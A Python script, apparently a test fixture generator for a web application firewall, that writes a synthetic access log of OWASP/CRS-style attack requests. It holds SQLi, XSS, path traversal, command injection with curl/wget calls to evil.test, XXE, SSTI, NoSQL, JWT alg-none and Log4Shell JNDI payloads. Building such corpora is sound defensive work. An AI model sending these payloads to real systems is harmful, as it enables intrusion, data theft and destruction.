#!/usr/bin/env python3
"""OWASP/CRS tarzı saldırı payload corpus — public test pattern'leri (sentetik access log)."""
from __future__ import annotations

import json
import os
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "corpus" / "owasp_crs_test.access"
MANIFEST = ROOT / "corpus" / "owasp_crs_manifest.json"
TARGET_LINES = int(os.environ.get("OWASP_CORPUS_LINES", "200"))
TS = "08/Jun/2026:10:15:01 +0300"


def line(ip: str, method: str, path: str, status: int = 403, ua: str = "OWASP-CRS-Test/1.0") -> str:
    return f'{ip} - - [{TS}] "{method} {path} HTTP/1.1" {status} 256 "-" "{ua}"'


def line_post(ip: str, path: str, body: str, status: int = 403) -> str:
    b = body.replace('"', '\\"')
    return (
        f'{ip} - - [{TS}] "POST {path} HTTP/1.1" {status} 128 "-" '
        f'"OWASP-CRS-Test/1.0" "-" "{b}"'
    )


def main() -> None:
    entries: list[dict[str, str]] = []

    def add(cat: str, raw: str) -> None:
        entries.append({"category": cat, "line": raw})

    # SQLi — OWASP WSTG / CRS common patterns
    sqli = [
        "/?id=1' OR '1'='1",
        "/search?q=1%27%20UNION%20SELECT%20null--",
        "/api?id=1;WAITFOR%20DELAY%20%270:0:5%27--",
        "/login?user=admin%27--",
        "/items?sort=1;DROP%20TABLE%20users--",
        "/report?filter=1%27%20AND%201=1",
        "/v1/users?id=1%27%20UNION%20ALL%20SELECT%20@@version--",
        "/shop?item=1%27%20AND%20SLEEP(5)--",
        "/data?x=1%27%20OR%201=1%23",
        "/admin/export?table=users%27%20OR%201=1--",
    ]
    for i, p in enumerate(sqli):
        add("sqli", line(f"198.18.1.{10 + i}", "GET", p))

    # XSS
    xss = [
        "/comment?text=%3Cscript%3Ealert(1)%3C/script%3E",
        "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E",
        "/profile?name=%3Csvg/onload=alert(document.cookie)%3E",
        "/api/echo?msg=javascript:alert(1)",
        "/guestbook?entry=%3Cbody%20onload=alert(1)%3E",
        "/redirect?url=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E",
        "/widget?html=%3Ciframe%20src=evil.test%3E",
        "/form?input=%3Cdetails%20open%20ontoggle=alert(1)%3E",
    ]
    for i, p in enumerate(xss):
        add("xss", line(f"198.18.2.{20 + i}", "GET", p))

    # LFI / path traversal
    lfi = [
        "/download?file=../../../etc/passwd",
        "/img?path=..%2f..%2f..%2fetc%2fpasswd",
        "/view?template=....//....//etc/shadow",
        "/include?page=php://filter/convert.base64-encode/resource=index.php",
        "/read?path=file:///etc/passwd",
        "/asset?url=....//....//windows/win.ini",
    ]
    for i, p in enumerate(lfi):
        add("lfi", line(f"198.18.3.{30 + i}", "GET", p))

    # RCE / command injection
    rce = [
        "/cgi-bin/run?cmd=;cat%20/etc/passwd",
        "/api/exec?run=|whoami",
        "/ping?host=127.0.0.1;id",
        "/tools?cmd=$(curl%20evil.test)",
        "/shell?x=`id`",
        "/diag?param=;wget%20http://evil.test/x",
    ]
    for i, p in enumerate(rce):
        add("rce", line(f"198.18.4.{40 + i}", "GET", p))

    # XXE
    xxe_bodies = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE x [<!ENTITY % s SYSTEM "http://evil.test/dtd">%s;]><r/>',
    ]
    for i, body in enumerate(xxe_bodies):
        add("xxe", line_post(f"198.18.5.{50 + i}", "/api/xml", body))

    # SSTI
    ssti = [
        "/render?tpl={{7*7}}",
        "/preview?template=${7*7}",
        "/page?name={{config.__class__.__init__.__globals__}}",
        "/doc?f=<%=7*7%>",
    ]
    for i, p in enumerate(ssti):
        add("ssti", line(f"198.18.6.{60 + i}", "GET", p))

    # NoSQL — waf_rules.c ile uyumlu pattern'ler
    nosql = [
        "/api/users?filter[$gt]=",
        "/api/login?user[$ne]=x&password[$ne]=y",
        "/search?q[$where]=sleep(5000)",
        "/mongo?query[$regex]=.*",
    ]
    for i, p in enumerate(nosql):
        add("nosql", line(f"198.18.7.{70 + i}", "GET", p))

    # JWT / auth abuse
    jwt = [
        "/api/token?alg=none",
        "/oauth?token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "/admin?jwt=..%2F..%2Fetc%2Fpasswd",
    ]
    for i, p in enumerate(jwt):
        add("jwt", line(f"198.18.8.{80 + i}", "GET", p))

    # Scanner / bot UA
    scanners = [
        ("sqlmap/1.8#stable", "/?id=1"),
        ("Nikto/2.5.0", "/admin/"),
        ("ZmEu", "/wp-login.php"),
        ("masscan/1.3", "/"),
        ("nmap lowttl script", "/robots.txt"),
    ]
    for i, (ua, p) in enumerate(scanners):
        add("scanner", line(f"198.18.9.{90 + i}", "GET", p, ua=ua))

    # Log4shell style
    log4j = [
        "/?x=${jndi:ldap://evil.test/a}",
        "/api?q=${jndi:dns://evil.test}",
        "/login?user=${::-j}${::-n}${::-d}${::-i}",
    ]
    for i, p in enumerate(log4j):
        add("log4shell", line(f"198.18.10.{100 + i}", "GET", p))

    # POST SQLi (log_guardian body field)
    post_sqli = [
        ("username=admin' OR '1'='1", "/login"),
        ("password=1'; DROP TABLE users--", "/auth"),
        ("q=1 UNION SELECT null,null--", "/api/search"),
    ]
    for i, (body, path) in enumerate(post_sqli):
        add("post_sqli", line_post(f"198.18.11.{110 + i}", path, body))

    # CRS varyant doldurma — OWASP_CORPUS_LINES (varsayilan 200)
    fill_templates = [
        ("sqli", "GET", "/api/item?id={}+OR+1=1--"),
        ("xss", "GET", "/search?q=%3Cscript%3Ealert({})%3C/script%3E"),
        ("lfi", "GET", "/file?path=..%2f..%2f..%2fetc%2fpasswd%00"),
        ("rce", "GET", "/run?cmd=;id%20{}"),
        ("nosql", "GET", "/api/find?filter[$gt]={}"),
        ("scanner", "GET", "/.env"),
    ]
    n = 0
    while len(entries) < TARGET_LINES:
        cat, method, tpl = fill_templates[n % len(fill_templates)]
        path = tpl.format(n)
        ip = f"198.18.{12 + (n // 256) % 40}.{n % 256}"
        if cat == "scanner":
            add(cat, line(ip, method, path, ua="sqlmap/1.8"))
        else:
            add(cat, line(ip, method, path))
        n += 1

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text("\n".join(e["line"] for e in entries) + "\n", encoding="utf-8")

    categories: dict[str, list[int]] = {}
    for idx, e in enumerate(entries):
        categories.setdefault(e["category"], []).append(idx)

    manifest = {
        "generated": TS,
        "source": "OWASP WSTG + CRS common test patterns (synthetic nginx access)",
        "corpus": str(OUT.relative_to(ROOT)),
        "lines_total": len(entries),
        "categories": {
            cat: {"count": len(idxs), "line_indices": idxs}
            for cat, idxs in sorted(categories.items())
        },
    }
    MANIFEST.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    print(f"[generate_owasp_corpus] {OUT} ({len(entries)} lines, {len(categories)} categories)")
    print(f"[generate_owasp_corpus] {MANIFEST}")


if __name__ == "__main__":
    main()
